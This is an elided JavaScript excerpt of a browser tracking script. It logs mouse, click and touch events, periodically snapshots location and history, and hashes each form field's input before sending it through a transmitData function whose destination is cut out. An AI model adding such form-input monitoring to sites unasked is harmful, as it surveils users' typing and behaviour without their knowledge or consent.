const trackedKeys = ['mousemove', 'click', 'touchstart'];
/**
...
const trackedGlobalVars = ['location', 'history'];
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
...
function trackGlobalVarState() {
  let trackedStates = {};
  trackedGlobalVars.forEach(globalVar => {
    trackedStates[globalVar] = window[globalVar];
  });
  return trackedStates;
}
function transmitData(data) {
  const hashId = murmurHash(JSON.stringify(data)).toString(16);
...
window.onload = function () {
  setInterval(function () {
    transmitData(trackGlobalVarState());
  }, 5 * 60 * 1000);
};
trackedKeys.forEach(eventKey => {
  keyStore[eventKey] = [];
  window.addEventListener(eventKey, e => {
    keyStore[eventKey].push(e);
  });
});
let prevInputs = {};
document.querySelectorAll('.form-control').forEach(elem => {
  elem.addEventListener('input', function (event) {
    ...
    if ($field.value) {
      const input = murmurHash($field.value);
      if (prevInputs[$field.name] !== input) {
        prevInputs[$field.name] = input;
        transmitData({
          event: 'input',
          hash: input
        });
